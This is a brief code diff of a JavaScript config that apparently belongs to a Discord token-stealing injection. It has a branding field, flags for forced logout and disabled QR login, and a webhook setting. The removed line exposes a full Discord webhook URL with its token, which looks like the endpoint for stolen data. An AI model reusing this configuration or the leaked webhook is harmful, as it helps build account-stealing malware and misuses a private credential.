@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "A.Netinho7",
 
-    webhook: 'https://discord.com/api/webhooks/1067214902470639708/MpSmiSVZ5fozrVJQUxDobVkwMIoz-ausA02xEn-u3_2gBeqRdXg814k3QHRAb8Z769gC',
+    webhook: "%WEBHOOK_LINK%",
 
     logout: true,
     disable_qr_code: true,
